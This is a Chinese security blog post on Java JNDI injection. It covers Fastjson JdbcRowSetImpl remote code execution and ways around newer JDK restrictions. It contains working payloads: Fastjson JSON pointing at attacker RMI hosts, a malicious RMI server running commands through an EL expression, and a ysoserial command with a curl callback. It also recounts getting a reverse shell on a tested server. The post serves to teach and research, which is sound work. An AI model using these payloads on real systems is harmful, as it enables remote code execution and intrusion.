<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Java JNDI 注入原理与高 JDK 版本绕过"><meta name="keywords" content="Java,JNDI"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>Java JNDI 注入原理与高 JDK 版本绕过 | J0k3r's Blog</title><link rel="shortcut icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?9e8a6ba1f41c0d7b000fcfd73f1c7929";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-159554347-1', 'auto');
ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-JNDI-注入原理"><span class="toc-number">1.</span> <span class="toc-text">0x01 JNDI 注入原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-什么是-JNDI-？"><span class="toc-number">1.1.</span> <span class="toc-text">1. 什么是 JNDI ？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-JNDI-References-注入"><span class="toc-number">1.2.</span> <span class="toc-text">2. JNDI References 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Fastjson-JdbcRowSetImpl-反序列化利用"><span class="toc-number">1.3.</span> <span class="toc-text">3. Fastjson JdbcRowSetImpl 反序列化利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-JDNI-注入在高版本-JDK-的绕过"><span class="toc-number">1.4.</span> <span class="toc-text">4. JDNI 注入在高版本 JDK 的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#（1）利用本地-Class-作为-Reference-Factory"><span class="toc-number">1.4.1.</span> <span class="toc-text">（1）利用本地 Class 作为 Reference Factory</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#实战案例"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">实战案例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（2）利用反序列化触发本地-Gadget"><span class="toc-number">1.4.2.</span> <span class="toc-text">（2）利用反序列化触发本地 Gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（3）JRPM-反序列化"><span class="toc-number">1.4.3.</span> <span class="toc-text">（3）JRPM 反序列化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">2.</span> <span class="toc-text">Reference</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center">求知若饥，虚心若愚</div><div class="follow-button"><a href="https://github.com/zhuxianjin">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">45</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">43</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/links/">友链</a><a class="site-page" href="/about/">关于我</a></span></div><div id="post-info"><div id="post-title">Java JNDI 注入原理与高 JDK 版本绕过</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-11</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>学习 Java JNDI 注入</p>
<a id="more"></a>
<h2 id="0x01-JNDI-注入原理"><a href="#0x01-JNDI-注入原理" class="headerlink" title="0x01 JNDI 注入原理"></a>0x01 JNDI 注入原理</h2><h3 id="1-什么是-JNDI-？"><a href="#1-什么是-JNDI-？" class="headerlink" title="1. 什么是 JNDI ？"></a>1. 什么是 JNDI ？</h3><p><strong>Java Naming and Directory Interface (JNDI)，Java 命名和目录接口</strong></p>
<p>客户端可以使用 JNDI 通过名称来发现和查找数据和对象，这些要查找对象可以存储在不同的命名或目录服务中，比如  Remote Method Invocation (RMI)，Common Object Request Broker Architecture (CORBA)， Lightweight Directory Access Protocol (LDAP) 或者 Domain Name Service (DNS)</p>
<p>官方结构图如下：</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/jndiarch.jpg" alt="img"></p>
<p><strong>Remote Method Invocation (RMI)，远程方法调用</strong></p>
<p>这个概念和 RPC 有点相似，但当然是不一样的，RPC 是 Remote Procedure Call，即远程过程调用，RMI 是远程方法调用，是<strong>面向对象</strong>的，以对象作为参数，<a href="https://www.geeksforgeeks.org/difference-between-rpc-and-rmi/" target="_blank" rel="noopener">https://www.geeksforgeeks.org/difference-between-rpc-and-rmi/</a></p>
<p>JAVA 的 RMI 依赖的通信协议为 JRMP (Java Remote Message Protocol ，Java 远程消息交换协议) ，而且在 RMI 中对象通过序列化的方式进行编码传输</p>
<p><strong>RMI 的远程方法调用过程</strong></p>
<p>RMI 是如何调用远程方法的呢，难道是把远程对象下载到客户端？RMI 确实传递了一个对象，但不是要使用的远程对象，而是 stub 对象， Java RMI stubs 是一个特殊类，用于客户端调用远程对象方法</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/codebase-2.gif" alt="the stub downloadling process"></p>
<p>上图为客户端获取 Java RMI stubs 的过程 ，stub 中含有远程对象的通信地址和端口等信息，调用过程如下：</p>
<ol>
<li><p>客户端调用 stub 上的方法</p>
</li>
<li><p>stub 连接到服务器，提交参数</p>
</li>
<li><p>服务器执行对应的方法，返回结果</p>
</li>
<li><p>stub 将结果交给客户端</p>
</li>
</ol>
<p>图中的 RMI Registry 即为 RMI 注册表，客户端连接后，用来返回远程对象的 stub，默认监听在 1099 端口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Hello hello = <span class="keyword">new</span> HelloImpl();</span><br><span class="line">        Registry registry = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建Registry</span></span><br><span class="line">            registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//绑定远程对象到 Registry</span></span><br><span class="line">        registry.bind(<span class="string">"hello"</span>, hello);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>客户端查询</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="string">"remote_host"</span>, <span class="number">1099</span>);</span><br><span class="line"><span class="comment">// 获取远程对象的引用</span></span><br><span class="line">Hello hello = (Hello) registry.lookup(<span class="string">"hello"</span>);</span><br><span class="line">hello.sayHello(<span class="string">"hello"</span>);</span><br></pre></td></tr></table></figure>
<h3 id="2-JNDI-References-注入"><a href="#2-JNDI-References-注入" class="headerlink" title="2. JNDI References 注入"></a>2. JNDI References 注入</h3><p>所谓的 JNDI 注入就是控制 lookup 函数的参数，这样来使客户端访问恶意的 RMI 或者 LDAP 服务来加载恶意的对象，从而执行代码，完成利用</p>
<p>在 JNDI 服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用 Reference 类实现的。Reference 类表示对存在于命名/目录系统以外的对象的引用。</p>
<p>具体则是指如果远程获取 RMI 服务器上的对象为 Reference 类或者其子类时，则可以从其他服务器上加载 class 字节码文件来实例化</p>
<p>Reference 类常用属性：</p>
<ul>
<li>className  远程加载时所使用的类名</li>
<li>classFactory  加载的 class 中需要实例化类的名称</li>
<li>classFactoryLocation 提供 classes 数据的地址可以是 file/ftp/http 等协议</li>
</ul>
<p>比如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exploit"</span>,<span class="string">"Exploit"</span>,<span class="string">"http://evilHost/"</span> );			</span><br><span class="line">registry.bind(<span class="string">"Exploit"</span>, <span class="keyword">new</span> ReferenceWrapper(reference));</span><br></pre></td></tr></table></figure>
<p>此时，假设使用 rmi 协议，客户端通过 lookup 函数请求上面 bind 设置的 Exploit</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">ctx.lookup(<span class="string">"rmi://evilHost/Exploit"</span>);</span><br></pre></td></tr></table></figure>
<p> 因为绑定的是 Reference 对象，客户端在本地 CLASSPATH 查找 Exploit 类，如果没有则根据设定的 Reference 属性，到URL： <a href="http://evilHost/Exploit.class" target="_blank" rel="noopener">http://evilHost/Exploit.class</a> 获取构造对象实例，构造方法中的恶意代码就会被执行</p>
<h3 id="3-Fastjson-JdbcRowSetImpl-反序列化利用"><a href="#3-Fastjson-JdbcRowSetImpl-反序列化利用" class="headerlink" title="3. Fastjson JdbcRowSetImpl 反序列化利用"></a>3. Fastjson JdbcRowSetImpl 反序列化利用</h3><p>这里以 Fastjson 为例，利用 JNDI 注入和 JdbcRowSetImpl 利用链实现 RCE</p>
<blockquote>
<p>Fastjson 是 Alibaba 的一个 JSON 库 <a href="https://github.com/alibaba/fastjson" target="_blank" rel="noopener">https://github.com/alibaba/fastjson</a></p>
</blockquote>
<p>通过 <a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a> 中的 marshalsec-0.0.3-SNAPSHOT-all.jar 快速开启 RMI 或者 LDAP 服务</p>
<p>然后在 Exploit.class 所在的目录开启一个 HTTP 服务，再 nc 监听一个端口接收反弹 shell 即可</p>
<p>Payload:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"x"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>: <span class="string">"rmi://192.168.169.112:1099/Exploit"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>成功反弹 shell</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/image-20200806184550746.png" alt="image-20200806184550746"></p>
<p>该漏洞环境的 Java 版本是 openjdk 1.8.0_102，实际环境中在目标服务器上经常会遇到高版本 jdk，</p>
<p>Oracle  JDK 6u45、7u21 之后：</p>
<p>java.rmi.server.useCodebaseOnly 的默认值被设置为 true</p>
<p>禁用自动加载远程类文件，仅从 CLASSPATH 和当前 JVM 的 java.rmi.server.codebase 指定路径加载</p>
<p><a href="https://www.oracle.com/java/technologies/javase/6u45-relnotes.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/6u45-relnotes.html</a></p>
<p><a href="https://www.oracle.com/java/technologies/javase/7u21-relnotes.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/7u21-relnotes.html</a></p>
<p>RMI + JNDI References</p>
<p>Oracle  JDK 6u141、7u131、8u121之后：</p>
<p>增加了com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 选项，默认值为 false</p>
<p>不允许 RMI 和 CORBA 从远程的 Codebase 加载 Reference 工厂类 </p>
<p><a href="https://www.oracle.com/java/technologies/javase/6-relnotes.html#R160_141" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/6-relnotes.html#R160_141</a></p>
<p><a href="https://www.oracle.com/java/technologies/javase/7u131-relnotes.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/7u131-relnotes.html</a></p>
<p><a href="https://www.oracle.com/java/technologies/javase/8u121-relnotes.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/8u121-relnotes.html</a></p>
<p><a href="https://www.oracle.com/java/technologies/javase/6-relnotes.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/6-relnotes.html</a></p>
<p>LDAP + JNDI References</p>
<p>Oracle  JDK 11.0.1、8u191、7u201、6u211之后:</p>
<p>设置 com.sun.jndi.ldap.object.trustURLCodebase  默认为 false</p>
<p>禁止 LDAP 协议使用远程 codebase</p>
<p><a href="https://www.oracle.com/java/technologies/javase/11u-relnotes.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/11u-relnotes.html</a></p>
<p><a href="https://www.oracle.com/java/technologies/javase/8u-relnotes.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/8u-relnotes.html</a></p>
<p><a href="https://www.oracle.com/java/technologies/javase/7-support-relnotes.html#R170_201" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/7-support-relnotes.html#R170_201</a></p>
<p>关于 codebase 的官方文档：<a href="https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html</a></p>
<p>能看出使用 LDAP 攻击的话，允许的 JDK 版本相对 RMI 要高一些，适用性会更强一些，只需要将 RMI 服务换成 LDAP 即可，同时 lookup 函数中的地址类型也要修改</p>
<h3 id="4-JDNI-注入在高版本-JDK-的绕过"><a href="#4-JDNI-注入在高版本-JDK-的绕过" class="headerlink" title="4. JDNI 注入在高版本 JDK 的绕过"></a>4. JDNI 注入在高版本 JDK 的绕过</h3><p>因为高版本禁止远程加载，那就在目标本地的 classpath（一组目录的集合，用于 jvm 搜索 class） 中找一个类作为恶意的 Reference Factory 工厂类，利用这个本地 Factory 类执行命令，或者直接构造恶意的序列化对象，利用反序列化Gadget完成利用，因为 JNDI 注入会对该对象进行反序列化</p>
<p>即：</p>
<ul>
<li>利用本地 Class 作为 Reference Factory</li>
<li>利用LDAP返回序列化数据，触发本地Gadget</li>
</ul>
<h4 id="（1）利用本地-Class-作为-Reference-Factory"><a href="#（1）利用本地-Class-作为-Reference-Factory" class="headerlink" title="（1）利用本地 Class 作为 Reference Factory"></a>（1）利用本地 Class 作为 Reference Factory</h4><p>满足要求的工厂类条件：</p>
<ol>
<li>存在于目标本地的 CLASSPATH 中</li>
<li>实现 javax.naming.spi.ObjectFactory 接口</li>
<li>少存在一个 getObjectInstance() 方法</li>
</ol>
<p>而存在于 Tomcat 依赖包中的 org.apache.naming.factory.BeanFactory 就是个不错的选择</p>
<p>getObjectInstance 方法如下</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/image-20200807173228459.png" alt="image-20200807173228459"></p>
<p>上图 119 行，传入的 Reference为 ResourceRef 类，后面通过反射的方式实例化 Reference 所指向的任意 Bean Class，调用 setter 方法为所有的属性赋值，该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象</p>
<p>再看后面代码</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/image-20200807181110449.png" alt="image-20200807181110449"></p>
<p>因为是 newInstance，所以只能调用无参构造，这就要求目标 class 得有无参构造方法，上面图中 “forceString” 可以给属性强制指定一个 setter 方法，参数为一个 String 类型</p>
<p>于是找到 javax.el.ELProcessor 作为目标 class，利用 el 表达式执行命令，工具  <a href="https://github.com/welk1n/JNDI-Injection-Bypass" target="_blank" rel="noopener">https://github.com/welk1n/JNDI-Injection-Bypass</a> 中的 EvilRMIServer.java 部分代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ReferenceWrapper <span class="title">execByEL</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException, NamingException</span>&#123;</span><br><span class="line">    ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="keyword">null</span>);</span><br><span class="line">    ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, String.format(</span><br><span class="line">            <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval("</span> +</span><br><span class="line">                    <span class="string">"\"java.lang.Runtime.getRuntime().exec('%s')\""</span> +</span><br><span class="line">                    <span class="string">")"</span>,</span><br><span class="line">            commandGenerator.getBase64CommandTpl()</span><br><span class="line">    )));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从代码中能看出该工具还有另一个利用方法，groovy.lang.GroovyShell，原理也是类似的</p>
<p>利用条件：</p>
<p>目标环境含有以下依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>因为要使用 javax.el.ELProcessor，所以需要 Tomcat 8+，SpringBoot 1.2.x+</p>
<p>恶意 RMI 服务代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            ResourceRef resourceRef = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>,<span class="keyword">null</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">//redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code</span></span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">            <span class="comment">//expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"</span>));</span><br><span class="line"></span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(resourceRef);</span><br><span class="line">            registry.bind(<span class="string">"hello"</span>,referenceWrapper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h5><p>在一次测试任务中正好遇到了这类情况，服务器 JDK 版本略高（get shell 后发现是 openjdk 1.8.0_201），存在 fastjson &lt;= 1.2.47 的反序列化漏洞，如下</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/image-20200807155451495.png" alt="image-20200807155451495"></p>
<p>但是使用 RMI + JNDI References 注入或者 LDAP + JNDI References 注入都是不行的，因为 JDK 版本限制，但是由于测试发现目标使用的是 springBoot，所以可以试一试 tomcat-el 利用链，利用本地 Class 作为 Reference Factory</p>
<p>这里直接使用 <a href="https://github.com/welk1n/JNDI-Injection-Bypass" target="_blank" rel="noopener">https://github.com/welk1n/JNDI-Injection-Bypass</a> 的代码了，放在服务器上启动一个恶意 RMI Server</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/image-20200807150818908.png" alt="image-20200807150818908"></p>
<p>payload 打一下</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"x"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>: <span class="string">"rmi://vps_host/ExecByEL"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/image-20200807151023449.png" alt="image-20200807151023449"></p>
<p>服务器接收到请求，默认反弹的 shell 监听端口是 5555，可以在 EvilRMIServer.java 代码里改</p>
<p>接收反弹 shell</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/image-20200807151130413.png" alt="image-20200807151130413"></p>
<h4 id="（2）利用反序列化触发本地-Gadget"><a href="#（2）利用反序列化触发本地-Gadget" class="headerlink" title="（2）利用反序列化触发本地 Gadget"></a>（2）利用反序列化触发本地 Gadget</h4><p>在使用 LDAP + JNDI Reference 注入受到目标 JDK 版本限制的时候，无法让目标使用我们的远程类，这时可以使用 LDAP 直接返回一个序列化的对象数据，因为如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化，利用目标本地 classpath 中的 gadget 进行反序列化而完成漏洞利用</p>
<p>假设目标使用了存在漏洞的 Commons Collections，先使用 ysoserial 生成一条反序列化 payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="string">'curl 192.168.169.112:7777'</span> | base64</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/image-20200810101742998.png" alt="image-20200810101742998"></p>
<p>因为现在 jdk 1.8 用的比较多，一些老 payload 如 CommonsCollections1、3 因为 jdk 更新了 AnnotationInvocationHandler，所以用不了，会出现<code>java.lang.Override missing element entrySet</code> 的错误</p>
<p>搭建恶意 ldap 服务，这里就直接使用 <a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo" target="_blank" rel="noopener">https://github.com/kxcode/JNDI-Exploit-Bypass-Demo</a> 中的代码了</p>
